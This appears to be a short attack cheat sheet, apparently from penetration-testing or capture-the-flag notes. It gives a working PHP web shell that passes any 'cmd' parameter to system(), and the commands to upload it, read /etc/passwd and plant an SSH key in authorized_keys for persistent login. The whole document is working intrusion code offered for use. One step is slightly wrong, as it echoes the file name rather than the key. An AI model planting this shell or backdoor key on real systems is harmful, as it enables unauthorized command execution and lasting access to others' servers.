webshell.php
```
upload > run
```
```
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
```
local side
sshkegen -t rsa
```
```
local side
cat id_rsa.pub (copy)
```
```
remote side
whoami
cat /etc/passwd
mkdir .ssh
echo "id_rsa.pub" >> .ssh/authorized_keys
cat .ssh/authorized_keys
```
```
local side
ssh <user>@<ip>
```
